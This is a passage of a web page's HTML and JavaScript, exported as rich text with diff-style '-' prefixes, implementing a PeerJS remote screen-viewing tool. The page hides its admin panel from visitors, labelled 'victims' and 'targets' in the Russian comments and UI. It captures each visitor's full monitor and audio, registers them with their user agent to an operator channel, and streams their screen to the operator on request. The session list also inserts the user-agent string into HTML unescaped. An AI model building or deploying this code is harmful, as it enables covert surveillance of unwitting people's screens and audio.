-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">    </span>&lt;!-- Вид админки --&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"admin-view"</span><span class="s3"> class</span><span class="s1">=</span><span class="s2">"admin-view"</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;</span><span class="s2">div</span><span class="s3"> class</span><span class="s1">=</span><span class="s2">"admin-header"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">div</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"admin-title"</span><span class="s2">&gt;📡 Панель управления&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">div</span><span class="s3"> style</span><span class="s2">=</span><span class="s4">"</span><span class="s5">font-size:12px; color:#64748b;"</span><span class="s2">&gt;Активных сессий: &lt;</span><span class="s4">span</span><span class="s3"> id</span><span class="s2">=</span><span class="s4">"count"</span><span class="s2">&gt;0&lt;/</span><span class="s4">span</span><span class="s2">&gt;&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">        </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p5"><span class="s2"><span class="Apple-converted-space">        </span></span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"session-list"</span><span class="s3"> class</span><span class="s1">=</span><span class="s2">"session-grid"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">div</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"empty-state"</span><span class="s2">&gt;Нет активных подключений. Ожидание целей...&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">        </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">    </span>&lt;!-- Модальное окно просмотра --&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"viewer-modal"</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"viewer-header"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">span</span><span class="s2">&gt;📺 Просмотр экрана: &lt;</span><span class="s4">span</span><span class="s3"> id</span><span class="s2">=</span><span class="s4">"current-target"</span><span class="s2">&gt;&lt;/</span><span class="s4">span</span><span class="s2">&gt;&lt;/</span><span class="s4">span</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">button</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"close-btn"</span><span class="s3"> onclick</span><span class="s2">=</span><span class="s4">"</span><span class="s7">stopViewing</span><span class="s5">()"</span><span class="s2">&gt;Закрыть&lt;/</span><span class="s4">button</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">        </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p7"><span class="s1"><span class="Apple-converted-space">        </span>&lt;</span><span class="s4">video</span><span class="s2"> id</span><span class="s1">=</span><span class="s4">"remote-video"</span><span class="s2"> autoplay playsinline controls</span><span class="s1">&gt;&lt;/</span><span class="s4">video</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;</span><span class="s4">script</span><span class="s2">&gt;</span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>// === НАСТРОЙКИ ===</span></p>
-<p class="p6"><span class="s7"><span class="Apple-converted-space">        </span>const</span><span class="s8"> CHANNEL_ID</span><span class="s6"> =</span><span class="s4"> 'eni-master-2026'</span><span class="s1">; </span><span class="s2">// Уникальный канал (можешь изменить)</span></p>
-<p class="p5"><span class="s2"><span class="Apple-converted-space">        </span></span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>let</span><span class="s5"> peer</span><span class="s6"> =</span><span class="s8"> null</span><span class="s1">;</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>let</span><span class="s5"> myStream</span><span class="s6"> =</span><span class="s8"> null</span><span class="s1">;</span></p>
-<p class="p4"><span class="s7"><span class="Apple-converted-space">        </span>let</span><span class="s2"> currentCall</span><span class="s6"> =</span><span class="s8"> null</span><span class="s1">;</span></p>
-<p class="p6"><span class="s7"><span class="Apple-converted-space">        </span>let</span><span class="s5"> activeSessions</span><span class="s6"> =</span><span class="s1"> {}; </span><span class="s2">// Хранилище сессий</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>// Проверяем, админ это или цель</span></p>
-<p class="p4"><span class="s7"><span class="Apple-converted-space">        </span>const</span><span class="s8"> isAdmin</span><span class="s6"> =</span><span class="s2"> window</span><span class="s1">.</span><span class="s2">location</span><span class="s1">.</span><span class="s2">hash</span><span class="s6"> ===</span><span class="s4"> '#admin'</span><span class="s1">;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>if</span><span class="s1"> (</span><span class="s5">isAdmin</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>initAdmin</span><span class="s6">();</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span><span class="s7"> else</span><span class="s2"> {</span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">            </span>// Если цель, скрываем админку</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'admin-view'</span><span class="s6">).</span><span class="s2">classList</span><span class="s6">.</span><span class="s7">add</span><span class="s6">(</span><span class="s4">'hidden'</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>// === ЛОГИКА ДЛЯ ЦЕЛИ ===</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>async function startSession</span><span class="s1">() </span><span class="s6">{</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> btn</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">getElementById</span><span class="s6">(</span><span class="s4">'start-btn'</span><span class="s6">);</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> status</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">getElementById</span><span class="s6">(</span><span class="s4">'victim-status'</span><span class="s6">);</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>try</span><span class="s6"> {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>btn</span><span class="s6">.</span><span class="s2">disabled</span><span class="s6"> =</span><span class="s8"> true</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>btn</span><span class="s6">.</span><span class="s2">textContent</span><span class="s6"> =</span><span class="s4"> 'Подключение к серверу...'</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">                </span></span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">                </span>// Запрос доступа к экрану</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>myStream</span><span class="s6"> =</span><span class="s7"> await</span><span class="s2"> navigator</span><span class="s6">.</span><span class="s2">mediaDevices</span><span class="s6">.</span><span class="s7">getDisplayMedia</span><span class="s6">({<span class="Apple-converted-space"> </span></span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>video: { cursor: </span><span class="s4">'always'</span><span class="s2">, displaySurface: </span><span class="s4">'monitor'</span><span class="s2"> }</span><span class="s6">,<span class="Apple-converted-space"> </span></span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>audio: </span><span class="s8">true</span><span class="s2"><span class="Apple-converted-space"> </span></span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>});</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>btn</span><span class="s6">.</span><span class="s2">classList</span><span class="s6">.</span><span class="s7">add</span><span class="s6">(</span><span class="s4">'hidden'</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>status</span><span class="s6">.</span><span class="s2">classList</span><span class="s6">.</span><span class="s7">remove</span><span class="s6">(</span><span class="s4">'hidden'</span><span class="s6">);</span></p>
-<p class="p1"><span class="s5"><span class="Apple-converted-space">                </span>status</span><span class="s6">.</span><span class="s5">innerHTML</span><span class="s6"> =</span><span class="s2"> '&lt;div class="dot active"&gt;&lt;/div&gt;&lt;span&gt;Сессия активна. Ожидание...&lt;/span&gt;'</span><span class="s6">;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">                </span>// Создаем Peer для цели</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>const</span><span class="s8"> victimId</span><span class="s6"> =</span><span class="s4"> 'victim-'</span><span class="s6"> +</span><span class="s5"> Math</span><span class="s6">.</span><span class="s2">random</span><span class="s6">().</span><span class="s2">toString</span><span class="s6">(</span><span class="s8">36</span><span class="s6">).</span><span class="s2">substr</span><span class="s6">(</span><span class="s8">2</span><span class="s6">, </span><span class="s8">8</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>peer</span><span class="s6"> = new</span><span class="s7"> Peer</span><span class="s6">(</span><span class="s2">victimId</span><span class="s6">);</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>peer</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'open'</span><span class="s6">, () =&gt; {</span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">                    </span>// Подключаемся к админу, чтобы сообщить о себе</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>connectToAdmin</span><span class="s6">(</span><span class="s5">victimId</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>});</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>peer</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'call'</span><span class="s6">, (</span><span class="s2">call</span><span class="s6">) =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                    </span>call</span><span class="s6">.</span><span class="s7">answer</span><span class="s6">(</span><span class="s2">myStream</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                    </span>currentCall</span><span class="s6"> =</span><span class="s2"> call</span><span class="s6">;</span></p>
-<p class="p1"><span class="s5"><span class="Apple-converted-space">                    </span>status</span><span class="s6">.</span><span class="s5">innerHTML</span><span class="s6"> =</span><span class="s2"> '&lt;div class="dot active"&gt;&lt;/div&gt;&lt;span&gt;Оператор просматривает экран&lt;/span&gt;'</span><span class="s6">;</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>});</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>myStream</span><span class="s6">.</span><span class="s7">getVideoTracks</span><span class="s6">()[</span><span class="s8">0</span><span class="s6">].</span><span class="s7">onended</span><span class="s6"> = () =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                    </span>location</span><span class="s6">.</span><span class="s7">reload</span><span class="s6">();</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>};</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>} </span><span class="s7">catch</span><span class="s2"> (</span><span class="s5">err</span><span class="s2">) {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>alert</span><span class="s6">(</span><span class="s4">'Ошибка: '</span><span class="s6"> +</span><span class="s5"> err</span><span class="s6">.</span><span class="s5">message</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>location</span><span class="s6">.</span><span class="s7">reload</span><span class="s6">();</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>}</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function connectToAdmin</span><span class="s1">(</span><span class="s5">victimId</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">            </span>// Пытаемся подключиться к админу, чтобы зарегистрироваться</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> adminConn</span><span class="s6"> =</span><span class="s5"> peer</span><span class="s6">.</span><span class="s2">connect</span><span class="s6">(</span><span class="s8">CHANNEL_ID</span><span class="s6">, { </span><span class="s2">reliable: </span><span class="s8">true</span><span class="s6"> });</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>adminConn</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'open'</span><span class="s6">, () =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>adminConn</span><span class="s6">.</span><span class="s7">send</span><span class="s6">({</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>type: </span><span class="s4">'register'</span><span class="s6">,</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>id: </span><span class="s5">victimId</span><span class="s6">,</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>ua: </span><span class="s5">navigator</span><span class="s2">.</span><span class="s5">userAgent</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>// === ЛОГИКА ДЛЯ АДМИНА ===</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function initAdmin</span><span class="s1">() </span><span class="s6">{</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'victim-view'</span><span class="s6">).</span><span class="s2">classList</span><span class="s6">.</span><span class="s7">add</span><span class="s6">(</span><span class="s4">'hidden'</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'admin-view'</span><span class="s6">).</span><span class="s2">style</span><span class="s6">.</span><span class="s2">display</span><span class="s6"> =</span><span class="s4"> 'block'</span><span class="s6">;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">            </span>// Создаем Peer с фиксированным ID канала</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>peer</span><span class="s6"> = new</span><span class="s7"> Peer</span><span class="s6">(</span><span class="s8">CHANNEL_ID</span><span class="s6">);</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>peer</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'open'</span><span class="s6">, () =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>console</span><span class="s6">.</span><span class="s7">log</span><span class="s6">(</span><span class="s4">'Admin connected as '</span><span class="s6"> +</span><span class="s8"> CHANNEL_ID</span><span class="s6">);</span></p>
-<p class="p1"><span class="s7"><span class="Apple-converted-space">                </span>addToast</span><span class="s6">(</span><span class="s2">'Панель управления активна'</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>peer</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'connection'</span><span class="s6">, (</span><span class="s2">conn</span><span class="s6">) =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>conn</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'data'</span><span class="s6">, (</span><span class="s2">data</span><span class="s6">) =&gt; {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                    </span>if</span><span class="s6"> (</span><span class="s5">data</span><span class="s6">.</span><span class="s5">type</span><span class="s6"> ===</span><span class="s4"> 'register'</span><span class="s6">) {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                        </span>addSession</span><span class="s6">(</span><span class="s5">data</span><span class="s6">.</span><span class="s5">id</span><span class="s6">, </span><span class="s5">data</span><span class="s6">.</span><span class="s5">ua</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                    </span>}</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>peer</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'error'</span><span class="s6">, (</span><span class="s2">err</span><span class="s6">) =&gt; {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>if</span><span class="s6"> (</span><span class="s5">err</span><span class="s6">.</span><span class="s5">type</span><span class="s6"> ===</span><span class="s4"> 'unavailable-id'</span><span class="s6">) {</span></p>
-<p class="p1"><span class="s7"><span class="Apple-converted-space">                    </span>addToast</span><span class="s6">(</span><span class="s2">'Ошибка: Канал уже занят. Измените CHANNEL_ID'</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">                </span>}</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function addSession</span><span class="s1">(</span><span class="s5">id</span><span class="s1">, </span><span class="s5">ua</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>activeSessions</span><span class="s6">[</span><span class="s2">id</span><span class="s6">] = { </span><span class="s2">ua</span><span class="s6">, </span><span class="s7">connected: </span><span class="s8">false</span><span class="s6"> };</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>renderSessions</span><span class="s6">();</span></p>
-<p class="p1"><span class="s7"><span class="Apple-converted-space">            </span>addToast</span><span class="s6">(</span><span class="s2">'Новое подключение: '</span><span class="s6"> +</span><span class="s5"> id</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function renderSessions</span><span class="s1">() </span><span class="s6">{</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> list</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">getElementById</span><span class="s6">(</span><span class="s4">'session-list'</span><span class="s6">);</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> count</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">getElementById</span><span class="s6">(</span><span class="s4">'count'</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>count</span><span class="s6">.</span><span class="s2">textContent</span><span class="s6"> =</span><span class="s2"> Object</span><span class="s6">.</span><span class="s7">keys</span><span class="s6">(</span><span class="s2">activeSessions</span><span class="s6">).</span><span class="s2">length</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s7"><span class="Apple-converted-space">            </span>if</span><span class="s6"> (</span><span class="s2">Object</span><span class="s6">.</span><span class="s7">keys</span><span class="s6">(</span><span class="s2">activeSessions</span><span class="s6">).</span><span class="s2">length</span><span class="s6"> ===</span><span class="s8"> 0</span><span class="s6">) </span><span class="s7">return</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>list</span><span class="s6">.</span><span class="s2">innerHTML</span><span class="s6"> =</span><span class="s4"> ''</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>Object</span><span class="s6">.</span><span class="s7">keys</span><span class="s6">(</span><span class="s2">activeSessions</span><span class="s6">).</span><span class="s7">forEach</span><span class="s6">(</span><span class="s2">id</span><span class="s6"> =&gt; {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>const</span><span class="s8"> s</span><span class="s6"> =</span><span class="s5"> activeSessions</span><span class="s6">[</span><span class="s5">id</span><span class="s6">];</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>const</span><span class="s8"> card</span><span class="s6"> =</span><span class="s5"> document</span><span class="s6">.</span><span class="s2">createElement</span><span class="s6">(</span><span class="s4">'div'</span><span class="s6">);</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>card</span><span class="s6">.</span><span class="s2">className</span><span class="s6"> =</span><span class="s4"> 'session-card'</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>card</span><span class="s6">.</span><span class="s2">innerHTML</span><span class="s6"> =</span><span class="s4"> `</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                    </span>&lt;div class="session-id"&gt;ID: </span><span class="s6">${</span><span class="s5">id</span><span class="s6">}</span><span class="s2">&lt;/div&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                    </span>&lt;div class="session-ua"&gt;</span><span class="s6">${</span><span class="s5">s</span><span class="s6">.</span><span class="s5">ua</span><span class="s6">}</span><span class="s2">&lt;/div&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                    </span>&lt;div class="session-actions"&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                        </span>&lt;button class="btn-sm btn-watch" onclick="watchSession('</span><span class="s6">${</span><span class="s5">id</span><span class="s6">}</span><span class="s2">')"&gt;👁 Смотреть&lt;/button&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                        </span>&lt;button class="btn-sm btn-disconnect" onclick="removeSession('</span><span class="s6">${</span><span class="s5">id</span><span class="s6">}</span><span class="s2">')"&gt;✖&lt;/button&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                    </span>&lt;/div&gt;</span></p>
-<p class="p1"><span class="s2"><span class="Apple-converted-space">                </span>`</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>list</span><span class="s6">.</span><span class="s7">appendChild</span><span class="s6">(</span><span class="s2">card</span><span class="s6">);</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function watchSession</span><span class="s1">(</span><span class="s5">targetId</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>if</span><span class="s6"> (!</span><span class="s5">targetId</span><span class="s6">) </span><span class="s2">return</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'viewer-modal'</span><span class="s6">).</span><span class="s2">style</span><span class="s6">.</span><span class="s2">display</span><span class="s6"> =</span><span class="s4"> 'flex'</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'current-target'</span><span class="s6">).</span><span class="s2">textContent</span><span class="s6"> =</span><span class="s2"> targetId</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>const</span><span class="s8"> call</span><span class="s6"> =</span><span class="s5"> peer</span><span class="s6">.</span><span class="s2">call</span><span class="s6">(</span><span class="s5">targetId</span><span class="s6">, new</span><span class="s2"> MediaStream</span><span class="s6">());</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>currentCall</span><span class="s6"> =</span><span class="s2"> call</span><span class="s6">;</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>call</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'stream'</span><span class="s6">, (</span><span class="s2">stream</span><span class="s6">) =&gt; {</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">                </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'remote-video'</span><span class="s6">).</span><span class="s2">srcObject</span><span class="s6"> =</span><span class="s2"> stream</span><span class="s6">;</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p10"><span class="s2"><span class="Apple-converted-space">            </span></span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>call</span><span class="s6">.</span><span class="s7">on</span><span class="s6">(</span><span class="s4">'close'</span><span class="s6">, () =&gt; {</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">                </span>stopViewing</span><span class="s6">();</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>});</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function stopViewing</span><span class="s1">() </span><span class="s6">{</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'viewer-modal'</span><span class="s6">).</span><span class="s2">style</span><span class="s6">.</span><span class="s2">display</span><span class="s6"> =</span><span class="s4"> 'none'</span><span class="s6">;</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>document</span><span class="s6">.</span><span class="s7">getElementById</span><span class="s6">(</span><span class="s4">'remote-video'</span><span class="s6">).</span><span class="s2">srcObject</span><span class="s6"> =</span><span class="s8"> null</span><span class="s6">;</span></p>
-<p class="p4"><span class="s7"><span class="Apple-converted-space">            </span>if</span><span class="s6"> (</span><span class="s2">currentCall</span><span class="s6">) </span><span class="s2">currentCall</span><span class="s6">.</span><span class="s7">close</span><span class="s6">();</span></p>
-<p class="p4"><span class="s2"><span class="Apple-converted-space">            </span>currentCall</span><span class="s6"> =</span><span class="s8"> null</span><span class="s6">;</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>function removeSession</span><span class="s1">(</span><span class="s5">id</span><span class="s1">) </span><span class="s6">{</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">            </span>delete</span><span class="s5"> activeSessions</span><span class="s2">[</span><span class="s5">id</span><span class="s2">];</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">            </span>renderSessions</span><span class="s6">();</span></p>
-<p class="p9"><span class="s2"><span class="Apple-converted-space">        </span>}</span></p>
